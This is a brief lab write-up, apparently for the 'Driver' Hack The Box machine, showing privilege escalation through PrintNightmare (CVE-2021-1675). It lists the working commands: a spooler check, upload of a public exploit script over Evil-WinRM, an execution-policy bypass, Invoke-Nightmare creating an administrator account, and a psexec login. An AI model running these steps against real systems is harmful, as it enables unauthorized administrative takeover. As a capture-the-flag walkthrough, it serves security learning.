# Alternative way to exploit Driver

## Privilege Escalation

Instead of exploiting the vulnerability in the **Ricoh printer**, it is possible to exploit the **PrintNightmare** vulnerability.

Checking if the box is vulnerable:
```
impacket-rpcdump @10.10.11.106

Protocol: [MS-RPRN]: Print System Remote Protocol  
Provider: spoolsv.exe
```

Uploading a PowerShell script for [CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675) to the box:
```
*Evil-WinRM* PS C:\ProgramData> upload CVE-2021-1675.ps1
```

Bypassing execution policy and running the script:
```
*Evil-WinRM* PS C:\ProgramData> Set-ExecutionPolicy Bypass -Scope Process
*Evil-WinRM* PS C:\ProgramData> ./CVE-2021-1675.ps1

*Evil-WinRM* PS C:\ProgramData> Invoke-Nightmare
```

The function creates an administrative user that can be used to login to the box:
```
impacket-psexec adm1n@10.10.11.106
```
